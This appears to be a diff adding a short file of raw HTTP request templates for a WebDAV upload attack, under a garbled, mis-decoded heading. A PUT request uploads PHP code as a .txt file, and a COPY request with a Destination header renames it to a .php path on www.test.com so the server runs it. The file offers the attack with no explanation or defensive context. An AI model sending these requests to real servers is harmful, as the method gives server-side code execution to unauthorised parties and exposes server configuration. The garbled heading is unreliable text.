@@ -1,0 +1,9 @@
+¹¹Ôì°ü£º
+COPY /test.txt HTTP/1.1
+
+Destination:http://www.test.com/test.php
+******************************************
+PUT /phpinfo.txt HTTP/1.1
+
+<?php phpinfo();?>
+******************************************
